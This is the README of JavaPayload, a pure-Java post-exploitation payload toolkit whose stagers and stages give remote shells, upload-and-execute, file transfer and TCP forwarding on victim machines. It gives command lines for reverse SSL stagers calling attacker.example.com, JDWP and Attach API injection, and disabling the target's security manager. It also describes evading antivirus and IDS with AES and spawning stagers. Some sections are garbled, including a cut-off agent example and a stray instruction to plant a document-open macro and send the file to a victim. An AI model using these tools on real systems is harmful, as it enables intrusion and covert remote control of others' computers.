<h1>JavaPayload - Platform independent Java stager payloads</h1>

<p><i>&copy; 2010, 2011 Michael 'mihi' Schierl, <tt>&lt;schierlm at users dot sourceforge dot net&gt;</tt></i></p>

<h2>Introduction</h2>

<p>There are very good frameworks available (like Metasploit) to exploit vulnerabilities in native applications.
They also support exploiting Java applications, but usually only provide platform-dependent native payloads (with focus
on Microsoft Windows platforms). When exploiting a vulnerability in a Java service or a vulnerability in the
Java browser plugin, it is not always clear which operating system you are targeting. In this case, pure Java
payloads can increase the chance of successful exploitation if the platform was guessed wrong.</p>

<p>This archive contains a collection of pure Java payloads, from simple Shell and UpExec payloads (which need - to some
degree - platform dependent parameters), to a <tt>JSh</tt> ("Java Shell") payload that supports an interactive shell to
query system properties, run applications, open TCP connections, navigate the filesystem and read/write text files.
Basic job control enables to run more than one command or TCP session via a single exploited session.</p>

<p>These payloads are modular, consisting of three parts: loaders, stagers and stages. For more details refer to the
sections below. Loaders, stagers and stages can be combined arbitrarily, and the stages and stagers can also be
used to integrate them into other exploit frameworks like Metasploit (if you are more Ruby-literate than me).</p>

<h3>Loaders</h3>

<p>Loaders are similar to exploits in Metasploit. They are responsible for loading the stager and executing it. As
the loaders included in this package do not really exploit vulnerabilities, I have named them loaders and not
exploits. Included loaders are standalone Java program loader (to load the payload via a remote upload/command
execution vulnerability), an Applet loader (to load the payload as a signed applet), am  "Agent" loader (to 
load the payload from an Agent Jar from disk into another Java process) and a JDWP 
loader (to load the payload into a process via the Java Debugger Wire Protocol without touching the disk on
the target machine - either an existing Java process that has a debugger port open or a new one loaded by remote
command execution of "<tt>java -Xrunjdwp:transport=dt_socket,suspend=y,server=y,address=9821</tt>").</p>

<p>The standalone loader can be started either from the original Jar file, from a custom-tailored Jar file that
includes only the needed classes, or from a custom-tailored Class file which is created on demand by the 
ObjectWeb ASM toolkit. Parameters for stagers and stages can be either embedded into the tailored jar/class file
or provided on the command line. Applets are always built as jar files and load their parameters from the
<tt>&lt;param&gt;</tt> tags from the HTML. Agent jars receive their parameters via the command line. The JDWP 
loader will create a new byte array in the target JVM, fill it with the class file, load it and invoke it.</p>

<h3>Stagers</h3>

<p>Stagers are responsible for obtaining a TCP connection (or any other connection providing both an InputStream 
and an OutputStream) to the attacker and loading the stages dynamically. A stager is a single class file
that extends the <tt>javapayload.stager.Stager</tt> class and does not depend on any other classes. It may implement
additional interfaces which are part of the Java API, but no custom interfaces. And it may not have any 
explicit constructors or inner classes.
(If the stager does not follow these principles, it will not work in combination with loaders that build
custom-tailored Jar or Class files). The stager will then obtain a list of classes (as byte arrays, prefixed with
a 32-bit length field; the last one is followed by a length field of zero), load them, and instantiate the last one
of them (which is expected to implement the <tt>javapayload.stage.Stage</tt> interface).</p>

<p>Included stagers are BindTCP, ReverseTCP, ReverseSLL (without certificate checking), and a LocalTest stager
that runs the stager in the same Java process which is used for the handler (useful for debugging more complex
stages). All these stagers (except the LocalTest one) will need a hostname and a port number as parameters.</p>

<p>There is also a JDWPTunnel stager that can be only used with the JDWPInjector and will tunnel the payload stream
directly over the JDWP connection. This is slower than a dedicated connection, but in some cases a dedicated
connection is not possible.</p>

<p>The BindMultiTCP stager works like the BindTCP stager, but can accept more than one connection at the same time.
This is useful if you want to test multiple payloads against the same machine. In case you want to make it stop 
listening, run the StopListening payload against it. Due to a race condition (the next socket accept is started
before the stager is finished), you will have to run it twice to make it really stop.</p>

<p>The ReverseTCP stager handler can auto-bind to a port if you specify # as the port number.
In this case, the stager handler will print the port number to stdout. When this handler is used
in conjunction with JDWPInjector or with the AttachInjector, the new port number will automatically be
used in the command line to the remote process.</p>

<p>BindUDP and ReverseUDP work like their TCP counterparts; note that due to the crude UDP
streaming emulation, you can use one host/port only for one simultaneous payload connection.</p>

<p>The stager handler MultiListen can be used to run a stage that only outputs information (like the SystemInformation stage)
multiple times (even multi-threaded). This will work with ReverseTCP and ReverseSSL stagers, you will have to give the full
command line for this to the stager. Example: <tt>MultiListen ReverseTCP attacker.example.com -- SystemInfo</tt>.
</p>

<p>It is also possible to "convert" any supported stager to a spawning stager. Often Java is embedded
into other systems (like web browsers), and when the user stops using your web site, your payload will be
killed - unless you use a spawning stager, which will make the stager not
run inside the victim process, but spawn a new process and run inside that one. This won't work for
some stagers, like <tt>JDWPTunnel</tt>, that depend on some external state of the process they are
loaded into, but any other stager that can build standalone class files can be used.</p>

<p>There is another drawback as well: As the new process will have to load the class from disk, your stager
will be dumped to disk (and deleted later), which may increase the risk of antivirus detection. On the
other hand, in the main usage scenario for these stagers - Java applets - the applet has been stored to
disk anyway (in the browser cache and/or the Java plugin cache).</p>

<h3>Dynstagers</h3>

<p>On several occasions (both included in JavaPayload and externally), stagers used to be generated
dynamically based on other stagers by Java code that usually uses the ASM library to do so. As a consequence, 
whenever you need such a stager, you will have to generate it and add it to the class path before you can use it.
Additionally, every generated stager needs a generated stager handler as well, although the stager handler could
usually have been handled by a generic class that holds a reference. In the 0.3 version, with introduction of
AES payloads, the number of generated payloads that would have to be shipped with JavaPayload exploded. Therefore,
a new concept of Dynstagers was introduced. A dynstager is basically stager whose name follows a specific syntax,
and that will be generated based on another stager, a dynstager parameter and optionally the stager and stage
arguments automatically in the background. It will be loaded into a in-memory classloader to be used (and maybe
built into loaders) without additional user interaction.</p>

<p>The general syntax of a dynstager name is <tt><i>dynstager</i>_<i>stager</i></tt>, or
<tt><i>dynstager</i>$<i>arg</i>_<i>stager</i></tt>. <i>stager</i> is another stager that might include yet another
dynstager (for constructions like <tt>Spawn_Spawn_AES_ReverseTCP</tt>), <i>arg</i> is an optional dynstager argument.</p>

<h3>Stages</h3>

<p>Stages are loaded by a stager and responsible for doing what you want to do on the victim's host (like provide a
shell or execute an uploaded file). The included stages are Exec (execute a command with parameters), 
UpExec (upload a file and execute it with parameters), Shell (execute a shell based on operating system, 
cmd.exe for Windows and /bin/sh for everything else), SystemInfo (return system information, including local and 
remote IP addresses) and JSh (try it yourself, it is awesome). All these stages will forward stdin, stdout and 
stderr streams automatically. Shell, SystemInfo and JSh do not need parameters, the other
two expect a command name and optional arguments - for UpExec the command name should be an absolute file name
on the attacker's machine, which will be uploaded to the temp directory and executed there.</p>

<p>A JCp stage (that does not require parameters) can be used to copy files from stager to handler and vice versa,
and a ForwardTCP stage can be used to forward (only) one TCP connection from stager to handler (for tunnelling
other ReverseTCP stagers. The latter requires two arguments, first one the (host:)port for the handler, the
second one (host:)port for the stager. Both connections can either open new connections (with host), or listen
on a port and accept the first connection that happens to connect to it.</p>

<p>In case you cannot supply the stage parameters at the time your stager is loaded, you can instead use the
SendParameters stage, which will send all the parameters "over the wire". It will accept another stage as its
first parameter and launch this stage with its own parameters. If you want to run more than one different stage
over the same stager, you can use the MultiStage stage, which also supports switching between different stages.
Note that the stages in the background are "paused", which is bad for stages like ForwardTCP. Therefore, you
can use the LaunchStager stage to launch a new stager from MultiStage, and separately connect to this one. In
case the stage loaded from this stager needs parameters, the separator needs to be --- instead of -- and all
other parameters starting with at least two dashes need one extra dash at the beginning. As a constructed
example,</p>

<p><tt>BindTCP localhost 1234 -- LaunchStager BindTCP localhost 2345 --- JSh</tt></p>

<p>will launch a BindTCP stager that will only launch another BindTCP stager with JSh stage and then exit the
(first) stager.</p>

<p>All the stage classes and optional uploaded data (like uploaded executables) are sent uncompressed, as well as the
interactive communication once the stage has been started. The latter cannot be changed easily (since compression
will work on chunks of data, you'd have to set some timeout and finish the current chunk whenever no input appears
for that timeframe); however, the sent stage classes and upload data can easily be compressed. The GZIP stage will
take another stage and its arguments as stager arguments, and will load the stage in compressed form.
The (small) GZIP stage itself will still have to be loaded uncompressed, however. In case the GZIP stage is too large,
there is an even smaller version of the GZIP stage, called GZ, which will try to use the stager's bootstrap method for
loading the secondary stage; this won't work with all stagers, though.</p>

<h3>Interaction with Metasploit</h3>

<p>Metasploit supports Java payloads, too; their stagers are limited to BindTCP and
ReverseTCP, though. As they use the same on-the-wire format, it is possible to start
a Metasploit exploit using <tt>reverse_tcp</tt> and let it connect to a StagerHandler
from JavaPayload; or - more likely - have an exploit or builder from JavaPayload and
let its ReverseTCP stager connect to a Metasploit <tt>multi/handler</tt> with payload 
<tt>java/meterpreter/reverse_tcp</tt>.</p>

<p>However, some of the JavaPayload builders bring special stagers that take advantage
of the protocol that is being exploited - such as JDWPTunnel or ServletFindSock. To couple
that one with Metasploit's meterpreter, a special LocalProxy stage handler is provided.</p>

<p>This stage expects a stager and its arguments as parameters; this stager will be
launched from the stage handler and the sockets will be connected to the stage handler's sockets,
making it possible to connect a ReverseTCP stager directly to a JDWPTunnel stager handler.</p>

<h2>Upcoming features</h2>

<p>I am currently working on a new stage that uses a dynamic classloader to load "normal" Java classes on demand over the stager input stream.
It also provides these classes with an unlimited number of streams tunnelled over the same stager input stream. It comes with a command line
client that can keep multiple "sessions" to payloads open and send commands to them by sending a serialized Java object that contains the
required command implementation. Supported commands include running stages (resulting in another pair of forwarded streams), running handlers (resulting
in new sessions "inside" sessions), copying files over sessions, a simple ping/echo test command, forwarding TCP connections, forwarding audio,
change audio mixer settings (volume/mute/recording source), take screenshots and remote control features, and the always-loved cat and telnet
commands. It comes with a job control similar to JSh (with backgrounding, but the jobs are all handled on the attacker's computer), and dynamically 
routes the forwarded streams over the shortest way available (i. e. if you have session s1 and run two handlers, there, you get sessions s1:s1 and s1:s2. 
Copying a file from s1:s1 to s1:s2 will send the file via the s1 session but <b>not</b> back to the attacker machine). The classloaders will also take
care about whether a parent session has the class already, so that the class will not be requested again. This handlers need a few tricks to work fine
in all conditons, especially since the stage uses static class loading, and the stager will avoid loading system classes over the network. So you can
run into a situation where the stage class' Class object is inaccessible to one of the command classes (as it is loaded by a child classloader), which
has to be solved by dynamically falling back to reflection. I already have an almost working prototype, but it will still need a bit of more testing before
I can release it.</p>

<p>Note that all will be implemented in pure Java with no line of native code!</p>

<p><i>Stay tuned!</i></p>

<h2>System requirements</h2>

<p><b>On the "attacker" machine:</b> Java Runtime Environment or Java Development Kit 6.0 or newer</p>

<p><b>On the "victim" machine:</b> Java Runtime Environment 1.2 or newer (some features require more recent JRE)</p>

<p>In case you want to use an older JDK on the "attacker" machine, see <tt>build-legacy.xml</tt>. You will need a JDK though, as you have to recompile it. In case you want to attack a JRE 1.1, prepend <tt>JavaPayload-jre1.1.jar</tt> to your classpath. Note that these options are provided as a convenience, but are not officially supported. So expect things to break.</p>

<h2>Quickstart</h2>

<p>When calling a loader, you can pass it parameters. The first parameter will always be the name of the stager
(case sensitive as it is sometimes used to load the class), followed by the stager parameters (usually
host and port). After them, there is a parameter consisting of only two dashes ("<tt>--</tt>") which is used to
separate stage arguments from stager arguments. After the dashes is the name of the stage (which is case sensitive
as well) and the stage parameters (command line). All the parameters are forwarded to the stage (to keep the stagers
small), so if you want to write your own stages, you'll have to find the double-dash yourself.</p>

<p>On the attacker's side there is a <i>handler</i> which is used to upload the correct classes to the stager
and forward streams. The included command-line handler is called <tt>javapayload.handler.stager.StagerHandler</tt> and
expects the same parameters that were passed to the loader. (The loader and the stager will know themselves
that they do not need a host name when they listen, but it should be in the command line nevertheless to make
command lines more uniform).</p>

<p>In the following examples I assume that you have <tt>JavaPayload.jar</tt> in your classpath; for some examples,
the ASM libraries and/or the JDK's <tt>tools.jar</tt> have to be in the classpath as well.</p>

<p>The examples use the <tt>ReverseSSL</tt> stager and the <tt>JSH</tt> stage; all the other stagers/stages can be used as well.</p>

<p>For all the loaders where you pass the complete stager args via command line, if you add a + sign to the beginning of 
the stager name, the stager will output a + sign to stdout when it is ready so you know when you can connect to it.</p>

<p>As of version 0.3, there is a command line interface that can be started just by calling
<tt>java -jar JavaPayload.jar</tt>. To use features that require <tt>tools.jar</tt>, copy it
from your JDK directory to JavaPayload's <tt>lib</tt> folder.</p>

<p>In case you want to make the jars even smaller, you can give <tt>--strip</tt> as first parameter
and all debug information will be removed from all the classes. If you don't like the standard jar output
name, you can give a filename ending with <tt>.jar</tt> as first parameter (but after the <tt>--strip</tt>).
This is supported for all the <tt>*JarBuilder</tt> commands, even for <tt>EmbeddedJarBuilder</tt>).</p>

<p>As the applet class name is shown to the user, it can be changed using the <tt>--name</tt> option of
JarBuilder. Don't forget to also change the code attribute in the HTML!</p>

<p>In case you give a <tt>readyURL</tt> parameter, this resource will be requested (and ignored) by the
applet as soon as its stager is ready.</p>

<h3>JDWP example</h3>

<p><b>On the "attacker" machine:</b></p>
<p><tt>java javapayload.builder.JDWPInjector 2010 ReverseSSL attacker.example.com 2010 --  JSh</tt></p>

<p><b>On the "victim" machine:</b></p>
<p><tt>java -Xrunjdwp:transport=dt_socket,suspend=y,server=n,address=attacker.example.com:2010</tt></p>

<p><i>Note:</i> As shown in this example, the same port can be used for both the JDWP connection and the reverse
TCP or SSL connection. You can also use different ports, if preferred.</p>

<p><i>Note 2:</i> If the target process has a security manager installed, loading the stage will most likely fail.
In that case you can add an exclamation mark to the port specification (like "2010!") to deactivate the security
manager in the target process. Note that in this case the security manager will remain disabled even after your
payload terminates, so make sure to not open additional security holes in your pen-test when trying this!</p>

<h3>JDWP tunnelling example</h3>

<p><b>On the "attacker" machine:</b></p>
<p><tt>java javapayload.builder.JDWPInjector 2010 JDWPTunnel -- JSh</tt></p>

<p><b>On the "victim" machine:</b></p>
<p><tt>java -Xrunjdwp:transport=dt_socket,suspend=y,server=n,address=attacker.example.com:2010</tt></p>

<h3>Agent example (loading the agent jar into a new Java process that runs a different program)</h3>
<p>This example requires Java 1.5 or above on both attacker and victim computer!</p>

<p><b>On the "attacker" machine:</b></p>

<p><tt>java javapayload.builder.AgentJarBuilder ReverseSSL</tt></p>
<p>copy Agent_ReverseSSL.jar to the victim's machine.</p>

<i>&lt;parameters for another Java program&gt;</i></tt></p>

<h3>Attach example (loading the Agent jar into an existing process on the same machine via Attach API)</h3>
<p>This example requires Java 1.6 or above on your computer! Start any other Java program and look up its pid
first:</p>

<p><tt>java javapayload.builder.AttachInjector list</tt></p>

<p>Then you can use the pid:</p>

<p><tt>java javapayload.builder.AgentJarBuilder ReverseSSL</tt></p>
<p><tt>java javapayload.builder.AttachInjector <i>&lt;pid&gt;</i> \absolute\path\to\Agent_ReverseSSL.jar ReverseSSL localhost 2010 -- JSh</tt></p>

Go to Tools-&gt;Customize-&gt;Events and add a document open event that runs your new macro. Make sure to save this event in the document (and not in the application). Save the document and send it to the victim.</p>

<h3>Spawning dynstager</h3>

<p>JavaPayload includes a <tt>Spawn</tt> dynstager that can be used to dynamically generate stagers
that spawn in a new process. They can be used like any other stagers, for example:</p>

<p><tt>java javapayload.handler.stager.StagerHandler Spawn_ReverseTCP localhost # -- JSh</tt></p>
<p><tt>java javapayload.loader.DynLoader Spawn_ReverseTCP localhost 1687 -- JSh</tt></p>

<p>On some systems (like Windows), the parent process information is lost when the parent process dies.
Therefore it can be useful to have a stager that spawns twice (so that the resulting child process it not
associated to any living parent process). Therefore, you can wrap a stager twice:</p>

<p><tt>java javapayload.loader.DynLoader Spawn_Spawn_ReverseTCP localhost 1687 -- JSh</tt></p>

<h3>AES dynstager</h3>

<p>Java classes on the wire are quite easy to spot (and detect by an IDS); if they slip though,
trying to chainload (UpExec) native executables might easily be detected. therefore it is
often advisable to encrypt the whole communication with AES or similar. Therefore, an AES dynstager
is included that can make almost every existing stager to use AES (While it is not possible to use 
AES_Spawn_* dynstagers, you can use Spawn_AES_* dynstagers).</p>

<p>To use them, add an additional argument <b>to the beginning</b> which is the password used
to derive the AES key from. The protocol uses the <tt>AES/CFB8/NoPadding</tt> mode with
random initialization vectors (prepended to the communication). Example:</p> 

<p><tt>java javapayload.handler.stager.StagerHandler AES_ReverseTCP verysecret localhost # -- JSh</tt></p>
<p><tt>java javapayload.loader.DynLoader AES_ReverseTCP verysecret localhost 1687 -- JSh</tt></p>

<p>You can also give "#" as the password, which will print the password to stdout, like ports
are handled with the ReverseTCP stager.</p>

<h3>AES stages</h3>

<p>Some stagers cannot be converted to AES stagers, in particular those that are not loaded
by a standard loader but built-in into a servlet or similar. In that case, an AES stage
is available, that can be used to dynamically encrypt the communication after the stage
has been sent. It uses some obfuscation techniques to hide its intents and make it less
likely to be detected "by accident". Nevertheless, the AES stager class is sent in
unencrypted form, therefore, if you can, better use the AES stagers.</p>

<p>This stage requires a password as first parameter; the second parameter is the name 
of the real stage, followed by the real stage arguments.</p>

<h3>Integrated dynstager</h3>

<p>In some scenarios it is helpful if you can reduce the amount of data transferred, or if you can 
connect to an exploit/payload without having JavaPayload available. The Integrated dynstager can be 
used to build a stager that integrates all the classes of a particular stage. As the output file 
depends on all the arguments, it is recommended to use a dynstager parameter that is different for
each dynstager created (the parameter itself is ignored by the dynstager).</p>

<p>For example,</p>
<p><tt>Integrated$JSh4444_BindTCP localhost 4444 -- JSh</tt></p>
<p>creates a stager listening on port 4444 that you can connect to via telnet and run JSh.</p>

<p>There is also a dynstager handler available in cases you want to connect via JavaPayload anyway.</p>

<p>This dynstager does not work sensibly with stagers that use a custom protocol (like ForwardTCP,
MultiStage or JCp), although it can (with the help of the dynstager handler) be used with those stagers.</p>

<p>An additional stager, Console, has been added, that expects the victim to sit at stdin and stdout.
It is useful to build "demo" jars that run a stager on the local machine via the Integrated dynstager.
The SpawnConsole stager handler acts similar to LocalTest - it will spawn another JVM and connect to that one via
stdin/stdout, thereby testing the Console stager.</p>

<p>This dynstage has two disadvantages: First, the stage to be run is fixed, you cannot stage another
stage even if you have JavaPayload available. And second, you are limited to a single stage and cannot
include more than one stage. The StageMenu stage overcomes these two limitations. First, it is possible
to stage a different stage over the same connection that is used to interactively control the menu (you will
have to start staging within 500 ms so that the menu has not been echoed), and you can give more than one
stage (separated by ---) where the user can select from. For example.</p>

<p><tt>StageMenu Shell --- JSh --- SystemInfo --- StopListening</tt></p>

<p>creates a menu of four different stages, still making it possible to stage anything else if desired.</p>

<h3>LocalStage dynstager</h3>

<p>This dynstager (and its handler) can be used with Jar builders, it will lookup stages from the
class path instead of staging it via the network. The JarBuilder syntax has been enhanced to give 
a list of stages to be included after two dashes. As this dynstager's output does not depend on
all the parameters, no dynstager parameters are needed or supported.</p>

<p>The DropExec stage can be used to drop a resource from the jar (which can also be added by JarBuilder)
and execute it, just like UpExec, but not via the network. (UpExec can be used with the Integrated
dynstager for a similar effect).</p>

<p>The LocalStageMenu stage works similar to the StageMenu stage, only that it looks up stages from the
class path, and it also supports custom command lines apart from those selectable from the menu.</p>

<h3>RMI injector</h3>

<p>RMI (Remote Method Invocation) is a protocol used to remotely invoke methods
on exported objects on other machines. More than one object can be exported via
the same RMI endpoint (IP + port). But regardless which objects you export yourself,
the DGC service (distributed garbage collector) is exported in (as I think) all cases.
When passing parameters to exported object that are not exported objects on the caller
machine (those get marshalled), they will be serialized and later deserialized on the
called machine. In case an object's class is not present on the called machine, it can
be dynamically loaded from a Jar URL (that should be accessible to both the caller and
the called VM) if not restricted by the RMI security manager (the default one does not).
All of these are documented features of RMI, therefore there is no vulnerability involved
to load a serializable class in the target VM and deserialize an instance of it. So,
better protect your RMI ports from strangers (like you do with your JDWP ports).</p>

<p>In Java 6, the JMX protocol was added to remotely monitor Java VMs. Basically, it is
plain RMI, just that the exported object can enforce some extra authentication
(username+password or certificate based). The authentication is only needed for the
JMX service, not for the DGC service exported on the same endpoint. (Un-)Fortunately,
unless the monitored application uses RMI itself, the JMX port will not allow loading
classes dynamically, so JMX is only "vulnerable" in case the monitoed application uses
RMI itself.</p>

<p>The PollingTunnel stager is also supported with this injector; special precautions
are taken to make sure the RMI object exported for it is exported on the same endpoint
that was used for injecting the payload.</p>
